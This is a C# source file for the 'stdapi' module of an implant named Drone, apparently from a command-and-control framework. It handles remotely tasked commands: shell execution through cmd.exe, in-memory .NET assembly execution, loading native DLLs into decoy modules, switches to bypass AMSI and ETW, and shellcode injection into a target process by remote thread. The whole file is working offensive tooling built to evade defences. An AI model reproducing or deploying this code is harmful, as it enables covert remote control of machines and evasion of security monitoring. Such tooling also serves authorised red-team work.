using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading;

using Drone.DInvoke.DynamicInvoke;
using Drone.DInvoke.Injection;
using Drone.DInvoke.ManualMap;
using Drone.Models;
using Drone.Modules;
using Drone.SharpSploit.Enumeration;
using Drone.SharpSploit.Execution;

namespace Drone
{
    public class StandardApi : DroneModule
    {
        public override string Name => "stdapi";

        public override List<Command> Commands => new List<Command>
        {
            new ("pwd", "Print working directory", GetCurrentDirectory),
            new ("cd", "Change working directory", ChangeCurrentDirectory, new List<Command.Argument>
            {
                new("path")
            }),
            new ("ls", "List filesystem", GetDirectoryListing, new List<Command.Argument>
            {
                new("path")
            }),
            new("ps", "List running processes", GetProcessListing),
            new ("getuid", "Get current identity", GetCurrentIdentity),
            new ("shell", "Run a command via cmd.exe", ExecuteShellCommand, new List<Command.Argument>
            {
                new("args", false)
            }),
            new("run", "Run a command", ExecuteRunCommand, new List<Command.Argument>
            {
                new("args")
            }),
            new ("execute-assembly", "Execute a .NET assembly", ExecuteAssembly, new List<Command.Argument>
            {
                new("/path/to/assembly.exe", false, true),
                new ("args")
            }),
            new ("overload", "Map and execute a native DLL", OverloadNativeDll, new List<Command.Argument>
            {
                new("/path/to/file.dll", false, true),
                new("export-name", false),
                new("args")
            }),
            new ("bypass", "Set a directive to bypass AMSI/ETW on tasks", SetBypass, new List<Command.Argument>
            {
                new("amsi/etw", false),
                new("true/false")
            }),
            new("shinject", "Inject arbitrary shellcode into a process", ShellcodeInject, new List<Command.Argument>
            {
                new("/path/to/shellcode.bin", false, true),
                new("pid", false)
            }),
        };

        private void GetCurrentDirectory(DroneTask task, CancellationToken token)
        {
            var result = Host.GetCurrentDirectory();
            Drone.SendResult(task.TaskGuid, result);
        }
        
        private void ChangeCurrentDirectory(DroneTask task, CancellationToken token)
        {
            var directory = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
            if (task.Arguments.Length > 0) directory = task.Arguments[0];
            
            Host.ChangeCurrentDirectory(directory);
            var current = Host.GetCurrentDirectory();
            
            Drone.SendResult(task.TaskGuid, current);
        }
        
        private void GetDirectoryListing(DroneTask task, CancellationToken token)
        {
            var directory = Host.GetCurrentDirectory();
            if (task.Arguments.Length > 0) directory = task.Arguments[0];

            var result = Host.GetDirectoryListing(directory);
            
            Drone.SendResult(task.TaskGuid, result.ToString());
        }
        
        private void GetProcessListing(DroneTask task, CancellationToken token)
        {
            var result = Host.GetProcessListing();
            Drone.SendResult(task.TaskGuid, result.ToString());
        }

        private void GetCurrentIdentity(DroneTask task, CancellationToken token)
        {
            var identity = WindowsIdentity.GetCurrent().Name;
            Drone.SendResult(task.TaskGuid, identity);
        }
        
        private void ExecuteShellCommand(DroneTask task, CancellationToken token)
        {
            var command = string.Join("", task.Arguments);
            var result = Shell.ExecuteShellCommand(command);
            
            Drone.SendResult(task.TaskGuid, result);
        }
        
        private void ExecuteRunCommand(DroneTask task, CancellationToken token)
        {
            var command = task.Arguments[0];
            var args = "";

            if (task.Arguments.Length > 1)
                args = string.Join("", task.Arguments.Skip(1));

            var result = Shell.ExecuteRunCommand(command, args);
            Drone.SendResult(task.TaskGuid, result);
        }
        
        private void ExecuteAssembly(DroneTask task, CancellationToken token)
        {
            var asm = Convert.FromBase64String(task.Artefact);
            var result = Assembly.Execute(asm, task.Arguments);

            Drone.SendResult(task.TaskGuid, result);
        }
        
        private void OverloadNativeDll(DroneTask task, CancellationToken token)
        {
            var dll = Convert.FromBase64String(task.Artefact);
            var decoy = Overload.FindDecoyModule(dll.Length);

            if (string.IsNullOrEmpty(decoy))
            {
                Drone.SendError(task.TaskGuid, "Unable to find a suitable decoy module ");
                return;
            }

            var map = Overload.OverloadModule(dll, decoy);
            var export = task.Arguments[0];

            object[] funcParams = { };

            if (task.Arguments.Length > 1)
                funcParams = new object[] {string.Join(" ", task.Arguments.Skip(1))};

            var result = (string) Generic.CallMappedDLLModuleExport(
                map.PEINFO,
                map.ModuleBase,
                export,
                typeof(GenericDelegate),
                funcParams);

            Drone.SendResult(task.TaskGuid, result);
        }
        
        private void SetBypass(DroneTask task, CancellationToken token)
        {
            var config = "";

            if (task.Arguments[0].Equals("amsi", StringComparison.OrdinalIgnoreCase))
                config = "BypassAmsi";

            if (task.Arguments[0].Equals("etw", StringComparison.OrdinalIgnoreCase))
                config = "BypassEtw";

            if (string.IsNullOrEmpty(config))
            {
                Drone.SendError(task.TaskGuid, "Not a valid configuration option");
                return;
            }

            var current = Config.GetConfig<bool>(config);

            if (task.Arguments.Length == 2)
            {
                if (!bool.TryParse(task.Arguments[1], out var enabled))
                {
                    Drone.SendError(task.TaskGuid, $"{task.Arguments[1]} is not a value bool");
                    return;
                }

                Config.SetConfig(config, enabled);
                current = Config.GetConfig<bool>(config);
            }

            Drone.SendResult(task.TaskGuid, $"{config} is {current}");
        }
        
        private void ShellcodeInject(DroneTask task, CancellationToken token)
        {
            if (!int.TryParse(task.Arguments[0], out var pid))
            {
                Drone.SendError(task.TaskGuid, "Not a valid PID");
                return;
            }

            var process = Process.GetProcessById(pid);

            var shellcode = Convert.FromBase64String(task.Artefact);
            var payload = new PICPayload(shellcode);
            var alloc = new SectionMapAlloc();
            var exec = new RemoteThreadCreate();

            var success = Injector.Inject(payload, alloc, exec, process);

            if (success)
            {
                Drone.SendResult(task.TaskGuid, $"Successfully injected {shellcode.Length} bytes into {process.ProcessName}");
                return;
            }
            
            Drone.SendError(task.TaskGuid, $"Failed to inject into {process.ProcessName}");
        }
        
        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        private delegate string GenericDelegate(string input);
    }
}